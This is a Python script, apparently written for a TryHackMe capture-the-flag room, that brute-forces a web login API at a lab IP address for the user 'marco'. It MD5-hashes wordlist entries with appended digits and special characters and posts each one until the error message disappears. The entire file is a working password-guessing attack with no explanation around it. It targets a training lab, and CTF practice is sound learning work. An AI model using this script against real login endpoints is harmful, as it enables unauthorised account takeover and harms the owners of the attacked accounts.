import requests
import hashlib
from string import punctuation
import sys

hash1 = hashlib.md5("admin".encode()).hexdigest()
headers = {
	'Accept' : 'application/json',
	'Accept-Language' : 'en-US,en;q=0.5',
	'Accept-Encoding' : 'gzip, deflate',
	'Referer' : 'http://10.10.192.131/login.php',
	'Origin' : 'http://10.10.192.131',
	'Content-type' : 'text/plain;charset=UTF-8'
}
url = "http://10.10.192.131/api/login"

# data = {
# 	'username' : 'admin',
# 	'password' :  hash1
# }
proxy = {
	'http' : '127.0.0.1:8080'
}
# response = requests.post(url,json = data,proxies=proxy)
# print(response.text)
# print(response)
# print("Incorrect Username or Password" in response.text)
def check(final_word):
	hash1 = hashlib.md5(final_word.encode()).hexdigest()
	# print(hash1)
	data = {
		'username' : 'marco',
		'password' :  hash1
	}
	response = requests.post(url,json = data,headers=headers)
	# print(response.text)
	print("[~] Trying ", final_word, end="\r")
	if "Incorrect Username or Password" not in response.text:
		return True
	return False


special_chars = "!@#$%^&*=?"
wordlist = open("/root/writeUps/tryhackme/year_of_the_pig/wordlist.txt", "r")
# words = wordlist.split("\n")
for word in wordlist:
	word = word[:len(word) - 1]
	# print(word)
	if check(word):
		print("\n[+] Found ", word)
		sys.exit()
		break
	for i in range(0,10):
		for j in range(0,10):
			for elem in special_chars:
				final_word = word + str(i) + str(j) + elem
				# print("Final word:", final_word)
				if check(final_word):
					print("\n[+] Found ", final_word)
					sys.exit()
					break